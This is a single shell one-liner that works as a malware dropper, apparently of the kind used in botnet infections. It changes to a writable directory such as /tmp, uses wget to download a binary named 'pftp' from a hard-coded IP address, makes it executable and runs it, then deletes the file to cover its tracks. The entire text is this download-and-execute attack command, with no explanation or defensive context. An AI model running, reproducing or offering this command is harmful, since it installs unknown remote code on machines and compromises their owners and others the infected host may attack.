cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.19.85/pftp; chmod +x pftp; ./pftp; rm -rf pftp
